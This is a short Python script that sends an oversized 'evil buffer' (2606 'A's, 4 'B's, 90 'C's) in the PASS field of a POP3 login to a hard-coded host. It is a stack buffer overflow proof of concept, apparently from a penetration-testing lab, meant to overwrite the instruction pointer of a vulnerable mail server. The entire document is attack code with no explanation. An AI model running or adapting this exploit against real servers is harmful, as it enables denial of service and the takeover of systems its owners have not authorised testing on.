#!/usr/bin/env python
import socket

if __name__=='__main__':

	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	evil_buffer = 'A' * 2606 + 'B' * 4 + "C" * 90

	try:
		print("[!] Sending evil buffer...")
		sock.connect(('10.11.21.97', 110))

		data = sock.recv(1024).decode('utf-8')
		
		buff = ("USER username\r\n").encode("utf-8")
		sock.send(buff)
		data = sock.recv(1024).decode("utf-8")
		print(data)

		buff = ("PASS " + evil_buffer + "\r\n").encode("utf-8")
		sock.send(buff)
		
		print("[*] Done!")
	except:
		print("Could not connect to POP3")
